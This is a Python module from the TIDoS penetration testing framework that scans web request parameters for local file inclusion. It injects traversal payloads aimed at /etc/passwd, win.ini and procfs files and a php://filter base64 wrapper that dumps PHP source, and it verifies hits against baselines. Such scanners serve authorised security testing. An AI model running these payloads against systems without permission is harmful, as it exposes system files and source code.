#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

# This module requires TIDoS Framework
# https://github.com/0xInfection/TIDoS-Framework

"""Local file inclusion / file read through request parameters."""

from __future__ import annotations

import posixpath
from urllib.parse import urlsplit

from core.methods import fileinj, inject
from core.methods import modkit as kit
from core.methods import webinj
from core.methods.print import pvln

info = ("Finds local file inclusion / arbitrary file read in request parameters. Every parameter "
        "(PARAM, or all parameters found by crawling) gets absolute paths, traversal sequences and "
        "filter-evasion variants for /etc/passwd, win.ini, boot.ini and procfs files, plus the "
        "php://filter base64 wrapper. A read is confirmed only when the file's content signature is "
        "in the response, not in the baseline, and not in a control request for a missing file; "
        "php://filter output is decoded and must contain PHP source. File-inclusion error messages "
        "that name the injected path are reported as low-confidence hints.")
searchinfo = "Local File Inclusion Scanner"
DEFAULT_DICT = "files/fuzz-db/lfi_paths.lst"
properties = {
    **inject.OPTIONS,
    **webinj.COOKIE_OPTION,
    "DICT": [f"Payload list; each line must target a recognisable file (default {DEFAULT_DICT})", ""],
}

CONFIRMED = "LFI (confirmed)"
POSSIBLE = "LFI (possible, low confidence)"


def plan(payloads: list[str]) -> list[tuple[str, str]]:
    """(payload, signature key) pairs; payloads aiming at unknown files are dropped."""
    out = [(p, fileinj.file_signature(p)) for p in payloads]
    keep = [(p, k) for p, k in out if k]
    if len(keep) < len(out):
        kit.warn(f"{len(out) - len(keep)} payload(s) skipped: their target file has no content "
                 "signature, so a read could not be proven.")
    return keep


def resources(point: inject.Point) -> list[str]:
    """Candidates for php://filter/.../resource=: the included name and the script itself."""
    orig = point.original.strip()
    script = posixpath.basename(urlsplit(point.url).path)
    names = [orig, posixpath.splitext(orig)[0], posixpath.splitext(script)[0], script, "index"]
    return list(dict.fromkeys(n for n in names if n and ":" not in n))[:4]


def check(point: inject.Point, s, items: list[tuple[str, str]]):
    base = fileinj.body(point.send(s, point.original))
    base2 = fileinj.body(point.send(s, inject.marker()))
    baseline = base + "\n" + base2  # nothing that shows up for a harmless value counts

    for payload, key in items:
        ev = fileinj.file_evidence(fileinj.body(fileinj.send(point, s, payload)), baseline, key)
        if not ev:
            continue
        ctl = fileinj.control_payload(payload, key)
        if ctl and fileinj.file_evidence(fileinj.body(fileinj.send(point, s, ctl)), baseline, key):
            continue  # the "file content" shows up for a missing file too
        yield inject.Finding(point, payload, f"{fileinj.file_label(key)} content: {ev}", CONFIRMED)
        return

    for res in resources(point):
        payload = f"php://filter/convert.base64-encode/resource={res}"
        src = fileinj.php_source(fileinj.body(point.send(s, payload)), baseline)
        if src:
            yield inject.Finding(point, payload, f"base64 PHP source returned: {src}", CONFIRMED)
            return

    token = inject.marker()
    payload = f"../{token}/{token}.txt"
    # only the original-value baseline here: a harmless value may itself trigger the error
    err = fileinj.inclusion_error(fileinj.body(point.send(s, payload)), base, token)
    if err:
        yield inject.Finding(point, payload, f"file/include error names the injected path: {err}", POSSIBLE)


def lfi(web):
    pvln("local file inclusion")
    rec = kit.Recorder(web, kit.CRITICAL, "lfi")
    items = plan(inject.payloads(properties, DEFAULT_DICT, label="LFI payload"))
    if not items:
        return []
    points = inject.discover(web, properties)
    if not points:
        rec("No injection points found.")
        return []
    kit.info(f"Testing {len(points)} parameter(s) with {len(items)} file payload(s) + php://filter...")
    s = webinj.session(properties, timeout=15)
    findings = inject.scan(points, lambda p: check(p, s, items))
    inject.report(findings, rec, clean="No local file inclusion found.")
    return findings


def attack(web):
    lfi(web)
